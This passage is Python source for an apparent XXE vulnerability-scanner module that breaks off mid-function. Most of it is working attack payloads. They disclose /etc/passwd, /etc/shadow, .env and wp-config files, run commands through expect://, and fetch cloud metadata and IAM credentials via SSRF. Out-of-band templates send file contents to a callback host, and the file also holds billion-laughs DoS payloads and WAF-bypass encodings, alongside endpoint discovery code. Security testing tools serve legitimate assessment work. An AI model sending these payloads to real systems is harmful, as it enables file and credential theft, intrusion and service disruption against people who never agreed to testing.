"""
XXE (XML External Entity) Scanner v3.0 GOD-MODE

Enterprise-grade XXE vulnerability scanner with:
- Multi-Vector XXE: Classic, Blind, OOB, Parameter Entity, Error-based
- 50+ Payload Variants: File disclosure, SSRF, RCE, DoS
- Protocol Support: file://, http://, ftp://, gopher://, php://, expect://, data://
- Parser Detection: Identifies XML parser type for targeted attacks
- DTD Variations: Internal, External, Parameter entities, Nested entities
- Encoding Bypass: UTF-7, UTF-16, entity encoding, CDATA bypass
- WAF Detection & Bypass: 12+ WAFs with evasion techniques
- Format Support: XML, SOAP, SVG, DOCX, XLSX, RSS, Atom, SAML
- OOB Exfiltration: DNS, HTTP, FTP callbacks
- Cross-Validation: Multiple confirmation for high confidence
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import random
import re
import string
from dataclasses import dataclass
from enum import Enum, auto
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import urljoin

import httpx

from scanning.findings import Finding, VulnType, VulnCategory
from scanning.vuln_scanner import ScanModule
from scanning.scan_context import ScanContext
from utils.logger import get_logger
from utils.scan_client import get_scan_client
from utils.network_utils import resolve_base_url
from utils.rate_limiter import RateLimiter
from utils.scanner_helpers import WAFType as BaseWAFType, WAFDetector as BaseWAFDetector

# Import OOB Engine for blind XXE detection
try:
    from utils.oob_engine import OOBEngine, CallbackType
    OOB_ENGINE_AVAILABLE = True
except ImportError:
    OOB_ENGINE_AVAILABLE = False

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)

# Version constant
XXE_SCANNER_VERSION = "3.0.0-GOD-MODE"


class XXEType(Enum):
    """XXE attack type."""
    CLASSIC = auto()           # Direct file disclosure
    BLIND = auto()             # No direct output
    ERROR_BASED = auto()       # Error message disclosure
    OOB_HTTP = auto()          # Out-of-band via HTTP
    OOB_DNS = auto()           # Out-of-band via DNS
    OOB_FTP = auto()           # Out-of-band via FTP
    PARAMETER_ENTITY = auto()  # Parameter entity injection
    SSRF = auto()              # Server-side request forgery
    DOS = auto()               # Denial of service (billion laughs)
    RCE = auto()               # Remote code execution (expect://)
    XINCLUDE = auto()          # FN-M4: XInclude (works even with DTD disabled)


class XMLParser(Enum):
    """XML parser types."""
    UNKNOWN = auto()
    LIBXML2 = auto()           # Default in PHP, Python lxml
    EXPAT = auto()             # Python xml.etree
    XERCES = auto()            # Java
    MSXML = auto()             # .NET
    SAXON = auto()             # XSLT processor
    LIBXMLJS = auto()          # Node.js


class ContentFormat(Enum):
    """XML content format types."""
    XML = auto()
    SOAP = auto()
    SVG = auto()
    RSS = auto()
    ATOM = auto()
    SAML = auto()
    XHTML = auto()
    DOCX = auto()
    XLSX = auto()
    PPTX = auto()


# WAFType - Use centralized version from scanner_helpers
class WAFType(Enum):
    """Web Application Firewall types - wraps centralized version."""
    NONE = auto()
    CLOUDFLARE = auto()
    AKAMAI = auto()
    AWS_WAF = auto()
    IMPERVA = auto()
    F5_BIG_IP = auto()
    MODSECURITY = auto()
    SUCURI = auto()
    FORTINET = auto()
    BARRACUDA = auto()
    AZURE_WAF = auto()
    WORDFENCE = auto()
    UNKNOWN = auto()

    @classmethod
    def from_base(cls, base_waf: BaseWAFType) -> "WAFType":
        """Convert from centralized WAFType."""
        mapping = {
            BaseWAFType.CLOUDFLARE: cls.CLOUDFLARE,
            BaseWAFType.AKAMAI: cls.AKAMAI,
            BaseWAFType.AWS_WAF: cls.AWS_WAF,
            BaseWAFType.IMPERVA: cls.IMPERVA,
            BaseWAFType.F5_BIG_IP: cls.F5_BIG_IP,
            BaseWAFType.MODSECURITY: cls.MODSECURITY,
            BaseWAFType.SUCURI: cls.SUCURI,
            BaseWAFType.FORTINET: cls.FORTINET,
            BaseWAFType.BARRACUDA: cls.BARRACUDA,
            BaseWAFType.AZURE_WAF: cls.AZURE_WAF,
            BaseWAFType.WORDFENCE: cls.WORDFENCE,
            BaseWAFType.UNKNOWN: cls.UNKNOWN,
            BaseWAFType.NONE: cls.NONE,
        }
        return mapping.get(base_waf, cls.UNKNOWN)


@dataclass
class XXEFinding:
    """XXE finding with detailed metadata."""
    url: str
    xxe_type: XXEType
    payload: str
    protocol: str
    parser: XMLParser
    content_format: ContentFormat
    detection_method: str
    evidence: list[str]
    confidence: int  # 0-100
    file_disclosed: Optional[str] = None
    waf_detected: Optional[WAFType] = None
    waf_bypassed: bool = False
    file_content: Optional[str] = None  # Actual extracted file content


class WAFDetector:
    """
    WAF detection for XXE - uses centralized BaseWAFDetector.

    Provides backward-compatible API while leveraging comprehensive
    signatures from utils/scanner_helpers.py.
    """

    @classmethod
    def detect(cls, response: httpx.Response) -> Optional[WAFType]:
        """Detect WAF from response using centralized detector."""
        base_waf_type, _ = BaseWAFDetector.detect(response)
        if base_waf_type == BaseWAFType.NONE:
            return None
        return WAFType.from_base(base_waf_type)

    @classmethod
    def is_blocked(cls, response: httpx.Response) -> bool:
        """Check if request was blocked by WAF."""
        _, is_blocked = BaseWAFDetector.detect(response)
        return is_blocked


class PayloadEncoder:
    """Encoding mutations for WAF bypass."""
    
    @staticmethod
    def utf7_encode(payload: str) -> str:
        """UTF-7 encoding for WAF bypass."""
        # Replace XML declaration with UTF-7
        return payload.replace(
            '<?xml version="1.0"',
            '<?xml version="1.0" encoding="UTF-7"'
        )
    
    @staticmethod
    def utf16_encode(payload: str) -> str:
        """UTF-16 encoding."""
        return payload.replace(
            '<?xml version="1.0"',
            '<?xml version="1.0" encoding="UTF-16"'
        )
    
    @staticmethod
    def entity_encode(text: str) -> str:
        """HTML entity encode."""
        result = ""
        for c in text:
            if c.isalpha():
                result += f"&#x{ord(c):x};"
            else:
                result += c
        return result
    
    @staticmethod
    def hex_encode_file(filepath: str) -> str:
        """Hex encode file path."""
        return ''.join(f"&#x{ord(c):x};" for c in filepath)
    
    @staticmethod
    def cdata_wrap(content: str) -> str:
        """Wrap in CDATA section."""
        return f"<![CDATA[{content}]]>"
    
    @staticmethod
    def parameter_entity_split(entity_name: str) -> str:
        """Split entity name for bypass."""
        if len(entity_name) > 2:
            mid = len(entity_name) // 2
            return f"{entity_name[:mid]}]]><![CDATA[{entity_name[mid:]}"
        return entity_name


class XXEScanner(ScanModule):
    """
    XXE Scanner v3.0 GOD-MODE
    
    Features:
    - Multi-vector XXE attacks (Classic, Blind, OOB, Error-based)
    - 50+ payload variants for different parsers
    - Protocol handler exploitation (file, http, ftp, php, expect, gopher)
    - XML parser fingerprinting
    - DTD-based attacks (internal, external, parameter entities)
    - Multiple content formats (XML, SOAP, SVG, RSS, SAML, Office)
    - WAF detection and bypass (12+ WAFs)
    - Encoding bypass (UTF-7, UTF-16, entity encoding)
    - OOB exfiltration (DNS, HTTP, FTP)
    - Billion laughs DoS detection
    - Cross-validation for confidence scoring
    """
    
    name = "xxe_scanner"
    
    # Minimum confidence threshold
    MIN_CONFIDENCE_THRESHOLD = 70
    
    # XML endpoints to probe
    XML_ENDPOINTS = [
        "/api/xml", "/api/v1/xml", "/api/v2/xml",
        "/xml", "/xmlrpc", "/xmlrpc.php",
        "/soap", "/soap/api", "/soapserver",
        "/wsdl", "/service.wsdl", "/api.wsdl",
        "/ws", "/webservice", "/services",
        "/import", "/api/import", "/data/import",
        "/upload", "/api/upload", "/file/upload",
        "/rss", "/feed", "/atom", "/rss.xml", "/feed.xml",
        "/svg", "/image/svg",
        "/saml", "/saml/sso", "/saml/acs", "/adfs/ls",
        "/sso", "/login/saml", "/auth/saml",
        "/api/parse", "/parse", "/process",
        "/convert", "/transform", "/xslt",
        "/export", "/api/export", "/report/export",
    ]
    
    # Content-Type headers for different formats
    CONTENT_TYPES = {
        ContentFormat.XML: ["application/xml", "text/xml"],
        ContentFormat.SOAP: ["text/xml; charset=utf-8", "application/soap+xml"],
        ContentFormat.SVG: ["image/svg+xml"],
        ContentFormat.RSS: ["application/rss+xml"],
        ContentFormat.ATOM: ["application/atom+xml"],
        ContentFormat.SAML: ["application/samlassertion+xml", "application/xml"],
        ContentFormat.XHTML: ["application/xhtml+xml"],
    }
    
    # ==================== CLASSIC XXE PAYLOADS ====================
    
    CLASSIC_PAYLOADS = {
        # Linux file disclosure
        "linux_passwd": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>''',

        "linux_shadow": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<root><data>&xxe;</data></root>''',

        "linux_hosts": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<root><data>&xxe;</data></root>''',

        "linux_hostname": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><data>&xxe;</data></root>''',

        # Windows file disclosure
        "windows_hosts": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<root><data>&xxe;</data></root>''',

        "windows_ini": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>''',

        "windows_boot": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini">
]>
<root><data>&xxe;</data></root>''',

        # Application files
        "web_config": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<root><data>&xxe;</data></root>''',

        "app_properties": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/application.properties">
]>
<root><data>&xxe;</data></root>''',

        "env_file": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///.env">
]>
<root><data>&xxe;</data></root>''',
    }
    
    # ==================== PHP WRAPPER PAYLOADS ====================
    
    PHP_PAYLOADS = {
        "php_filter_base64": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root><data>&xxe;</data></root>''',

        "php_filter_config": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<root><data>&xxe;</data></root>''',

        "php_filter_wp_config": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
]>
<root><data>&xxe;</data></root>''',

        "php_expect_id": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root><data>&xxe;</data></root>''',

        "php_expect_whoami": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://whoami">
]>
<root><data>&xxe;</data></root>''',

        "php_data_base64": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "data://text/plain;base64,WFhFX1RFU1RfTUFSS0VS">
]>
<root><data>&xxe;</data></root>''',
    }
    
    # ==================== SSRF PAYLOADS ====================
    
    SSRF_PAYLOADS = {
        "aws_metadata": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>''',

        "aws_credentials": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>''',

        "aws_user_data": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data">
]>
<root><data>&xxe;</data></root>''',

        "gcp_metadata": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/">
]>
<root><data>&xxe;</data></root>''',

        "azure_metadata": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
]>
<root><data>&xxe;</data></root>''',

        "localhost_probe": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<root><data>&xxe;</data></root>''',

        "internal_scan": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/">
]>
<root><data>&xxe;</data></root>''',
    }
    
    # ==================== PARAMETER ENTITY PAYLOADS ====================
    
    PARAMETER_ENTITY_PAYLOADS = {
        "param_basic": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">
  %eval;
  %error;
]>
<root>test</root>''',

        # NOTE: This payload requires hosting an external DTD file for blind XXE
        # The OOB Engine handles this dynamically in _test_oob_xxe()
        "param_external_dtd": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://CALLBACK_HOST/evil.dtd">
  %xxe;
]>
<root>test</root>''',

        "param_nested": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'file:///etc/passwd'>">
  %a;
  %b;
]>
<root>test</root>''',
    }
    
    # ==================== BLIND/OOB PAYLOADS ====================
    # NOTE: These are TEMPLATES. The actual OOB testing uses dynamic f-strings
    # in _test_oob_xxe() with real callback tokens from the OOB Engine.
    # These templates show the structure for reference/manual testing.

    OOB_PAYLOADS = {
        "oob_http": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://CALLBACK_HOST/TOKEN?x=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>''',

        "oob_dns": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://TOKEN.callback.example.com/xxe">
  %xxe;
]>
<root>test</root>''',

        "oob_ftp": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://CALLBACK_HOST/%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>''',

        "oob_gopher": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://CALLBACK_HOST:70/_XXE_TEST">
]>
<root>&xxe;</root>''',
    }
    
    # ==================== ERROR-BASED PAYLOADS ====================
    
    ERROR_PAYLOADS = {
        "error_file_not_found": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>''',

        "error_invalid_uri": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://invalid/%file;'>">
  %eval;
  %error;
]>
<root>test</root>''',
    }
    
    # ==================== DoS PAYLOADS ====================
    
    DOS_PAYLOADS = {
        "billion_laughs": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>''',

        "quadratic_blowup": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
]>
<root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</root>''',

        "external_dtd_dos": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://127.0.0.1:1/">
<root>test</root>''',
    }
    
    # ==================== SOAP PAYLOADS ====================
    
    SOAP_PAYLOADS = {
        "soap_xxe": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>''',

        "soap12_xxe": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>''',
    }
    
    # ==================== SVG PAYLOADS ====================
    
    SVG_PAYLOADS = {
        "svg_xxe": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="50">&xxe;</text>
</svg>''',

        "svg_xlink": '''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="file:///etc/passwd"/>
</svg>''',
    }
    
    # ==================== WAF BYPASS PAYLOADS ====================
    
    WAF_BYPASS_PAYLOADS = {
        "utf16_bypass": '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',

        "encoding_bypass": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x65;&#x74;&#x63;&#x2f;&#x70;&#x61;&#x73;&#x73;&#x77;&#x64;">
]>
<root>&xxe;</root>''',

        "cdata_bypass": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[<data>]]>&xxe;<![CDATA[</data>]]></root>''',

        "null_byte_bypass": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd%00">
]>
<root>&xxe;</root>''',

        "double_entity": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % a "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
  %a;
]>
<root>&xxe;</root>''',
    }
    
    # ==================== XINCLUDE PAYLOADS ====================
    # FN-M4 FIX: XInclude can bypass XXE protections that only disable DTDs

    XINCLUDE_PAYLOADS = {
        # Basic XInclude - works even with DTD disabled
        "xinclude_basic": '''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>''',

        # XInclude with fallback
        "xinclude_fallback": '''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text">
    <xi:fallback>fallback content</xi:fallback>
  </xi:include>
</root>''',

        # XInclude for Windows
        "xinclude_windows": '''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///c:/windows/win.ini" parse="text"/>
</root>''',

        # XInclude SSRF
        "xinclude_ssrf": '''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://169.254.169.254/latest/meta-data/" parse="text"/>
</root>''',

        # XInclude with xpointer (can extract portions of files)
        "xinclude_xpointer": '''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" xpointer="xpointer(//*)" parse="xml"/>
</root>''',

        # XInclude in SOAP
        "xinclude_soap": '''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:xi="http://www.w3.org/2001/XInclude">
  <soap:Body>
    <xi:include href="file:///etc/passwd" parse="text"/>
  </soap:Body>
</soap:Envelope>''',

        # XInclude in SVG
        "xinclude_svg": '''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</svg>''',
    }

    # ==================== FILE INDICATORS ====================
    
    FILE_INDICATORS = {
        "linux_passwd": ["root:x:0:0", "root:", "daemon:", "bin:", "sys:", "nobody:", "/bin/bash", "/bin/sh"],
        "linux_shadow": ["root:", "$1$", "$5$", "$6$", "$y$"],
        "linux_hosts": ["127.0.0.1", "localhost", "::1"],
        "windows_hosts": ["127.0.0.1", "localhost"],
        "windows_ini": ["[fonts]", "[extensions]", "[mci extensions]"],
        "aws_metadata": ["ami-id", "instance-id", "instance-type", "local-hostname"],
        "gcp_metadata": ["attributes", "disks", "hostname", "zone"],
        "azure_metadata": ["compute", "network", "vmId"],
    }
    
    # ==================== ERROR INDICATORS ====================
    
    ERROR_INDICATORS = [
        "external entity",
        "entity reference",
        "DOCTYPE",
        "failed to load external entity",
        "parser error",
        "undefined entity",
        "not well-formed",
        "XML parse error",
        "XMLReader",
        "DOMDocument",
        "SimpleXML",
        "SAXException",
        "lxml.etree",
        "org.xml.sax",
        "javax.xml",
        "System.Xml",
        "ENTITY",
        "DTD",
    ]
    
    def __init__(
        self,
        settings: "Settings",
        *,  # Force keyword args for DI parameters
        oob_engine: Any = None,  # Phase 8: Optional injected OOBEngine
    ) -> None:
        # Phase 8: Pass injected dependencies to base class
        super().__init__(settings, oob_engine=oob_engine)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
        self.detected_waf: Optional[WAFType] = None
        self.detected_parser: XMLParser = XMLParser.UNKNOWN
        self.findings: list[XXEFinding] = []

        # OOB Engine for blind XXE detection
        # Phase 8: Use injected OOB engine if available, otherwise create one
        self._oob_engine = self.get_oob_engine()  # From ScanModule base class
        self._scan_id = ""

        if self._oob_engine is None and OOB_ENGINE_AVAILABLE:
            try:
                self._oob_engine = OOBEngine(
                    callback_host="127.0.0.1",
                    callback_port=8888,
                    callback_domain="oob.phantom.local",
                    start_server=False,
                )
                logger.debug("[XXE] OOB Engine initialized locally for blind detection")
            except Exception as e:
                logger.debug(f"[XXE] OOB Engine initialization failed: {e}")
        elif self._oob_engine is not None:
            logger.debug("[XXE] Using injected OOB Engine for blind detection")
    
    def _generate_marker(self) -> str:
        """Generate unique marker for OOB detection."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """
        Scan for XXE vulnerabilities.
        
        GOD-MODE scanning strategy:
        1. WAF Detection
        2. XML Parser Fingerprinting
        3. Endpoint Discovery
        4. Classic XXE (file disclosure)
        5. PHP Wrapper XXE
        6. SSRF via XXE
        7. Parameter Entity XXE
        8. OOB/Blind XXE
        9. Error-based XXE
        10. Format-specific XXE (SOAP, SVG, etc.)
        11. WAF Bypass attempts
        12. Cross-validation
        """
        self.findings = []

        base_url = resolve_base_url(host)

        if isinstance(asset_data, dict):
            forms = asset_data.get("forms", [])
        if isinstance(asset_data, dict):
            urls = asset_data.get("urls", [])

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._ctx.log_context_status()
        self._auth_headers = self._ctx.auth_headers
        if self._ctx.has_auth:
            logger.info(f"[XXE] Using authenticated session ({self._ctx.auth_method})")

        # ENHANCEMENT 2026-02-20: Get endpoint_params and vuln_type_hints from metadata discovery
        # This enables testing of endpoints discovered from /scanner, /api-docs, etc.
        endpoint_params: dict[str, list[str]] = {}
        vuln_type_hints: dict[str, list[str]] = {}
        if isinstance(asset_data, dict):
            endpoint_params = asset_data.get("endpoint_params", {})
            vuln_type_hints = asset_data.get("vuln_type_hints", {})
        if endpoint_params:
            logger.info(f"[XXE] Received {len(endpoint_params)} endpoints with params from metadata discovery")

        # Add metadata-discovered endpoints with XXE hints
        xxe_hint_types = {"XXE", "XML_EXTERNAL_ENTITY", "XML_INJECTION"}
        for ep_url, hints in vuln_type_hints.items():
            if not any(h in xxe_hint_types for h in hints):
                continue
            # Normalize URL
            if ep_url.startswith("/"):
                full_url = f"{base_url}{ep_url}"
            elif not ep_url.startswith("http"):
                full_url = f"{base_url}/{ep_url}"
            else:
                full_url = ep_url
            # Add as a form target (XXE requires POST with XML body)
            forms.append({"action": full_url, "method": "POST", "metadata_discovered": True})
            urls.append(full_url)
            logger.debug(f"[XXE] Adding metadata endpoint: {full_url}")
        if vuln_type_hints:
            xxe_hinted = sum(1 for hints in vuln_type_hints.values() if any(h in xxe_hint_types for h in hints))
            if xxe_hinted > 0:
                logger.info(f"[XXE] Added {xxe_hinted} endpoints with XXE hints")

        # SHARED FINDINGS STORE: Cross-module targeting
        if isinstance(asset_data, dict):
            shared_store = asset_data.get("shared_findings_store")
        if shared_store:
            from utils.shared_findings_store import VulnType
            # XXE can chain with SSRF and file-related vulnerabilities
            for vtype in [VulnType.SSRF, VulnType.LFI]:
                for sf in shared_store.get_findings_by_type(vtype):
                    if sf.endpoint:
                        forms.append({"action": sf.endpoint, "method": "POST"})
                        logger.debug(f"[XXE] Cross-module target from {sf.module}: {sf.endpoint}")

        async with get_scan_client(
            timeout=self.timeout,
            follow_redirects=True,
            custom_headers=self._auth_headers,
        ) as client:
            
            # TIMEOUT-FIX 2026-02-12: Add timeout for each phase to prevent hanging
            # PERF-FIX 2026-02-12: Reduced from 15s to 10s per phase for faster completion
            phase_timeout = 10.0  # Max 10s per phase

            # Phase 1: WAF Detection
            try:
                self.detected_waf = await asyncio.wait_for(
                    self._detect_waf(client, base_url, rate_limiter),
                    timeout=phase_timeout
                )
                if self.detected_waf:
                    logger.info(f"WAF detected: {self.detected_waf.name}")
            except asyncio.TimeoutError:
                logger.debug("[XXE] WAF detection timeout")
                self.detected_waf = None

            # Phase 2: Find XML endpoints
            try:
                xml_endpoints = await asyncio.wait_for(
                    self._find_xml_endpoints(client, base_url, rate_limiter),
                    timeout=phase_timeout
                )
                logger.info(f"Found {len(xml_endpoints)} potential XML endpoints")
            except asyncio.TimeoutError:
                logger.debug("[XXE] Endpoint discovery timeout")
                xml_endpoints = []

            # Phase 3: Test endpoints for XXE
            # PERF-FIX 2026-02-12: Reduced from 20 to 8 endpoints (XXE is rare, most apps don't accept XML)
            # Also reduced per-endpoint timeout to 3s since we test fewer payloads
            max_endpoints = 8
            endpoint_timeout = 3.0

            for endpoint in xml_endpoints[:max_endpoints]:
                try:
                    await asyncio.wait_for(
                        self._test_endpoint(client, base_url, endpoint, rate_limiter),
                        timeout=endpoint_timeout
                    )
                except asyncio.TimeoutError:
                    logger.debug(f"[XXE] Endpoint timeout: {endpoint}")

            # Phase 4: Test forms
            try:
                await asyncio.wait_for(
                    self._test_forms(client, base_url, forms, rate_limiter),
                    timeout=phase_timeout
                )
            except asyncio.TimeoutError:
                logger.debug("[XXE] Forms test timeout")

            # Phase 5: Test SOAP services
            try:
                await asyncio.wait_for(
                    self._test_soap(client, base_url, rate_limiter),
                    timeout=phase_timeout
                )
            except asyncio.TimeoutError:
                logger.debug("[XXE] SOAP test timeout")

            # Phase 6: Test SVG upload points
            try:
                await asyncio.wait_for(
                    self._test_svg_endpoints(client, base_url, urls, rate_limiter),
                    timeout=phase_timeout
                )
            except asyncio.TimeoutError:
                logger.debug("[XXE] SVG test timeout")

            # Phase 7: Test blind/OOB XXE (if no findings yet or need confirmation)
            # PERF-FIX 2026-02-12: Reduced from 10 to 5 endpoints for OOB tests
            if len(self.findings) == 0 or all(f.confidence < 80 for f in self.findings):
                try:
                    await asyncio.wait_for(
                        self._test_oob_xxe(client, base_url, xml_endpoints[:5], rate_limiter),
                        timeout=phase_timeout
                    )
                except asyncio.TimeoutError:
                    logger.debug("[XXE] OOB test timeout")

        # Convert findings to dict format
        findings_dicts = []
        for f in self.findings:
            if f.confidence >= self.MIN_CONFIDENCE_THRESHOLD:
                findings_dicts.append(self._finding_to_dict(f))

        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
        try:
            from utils.shared_findings_store import SharedFindingsStore, VulnType
            store = SharedFindingsStore.get_instance()
            for f in findings_dicts:
                if isinstance(f, dict):
                    metadata = f.get("metadata", {})
                    if isinstance(asset_data, dict):
                        endpoint = f.get("matched_at") or metadata.get("url", "")
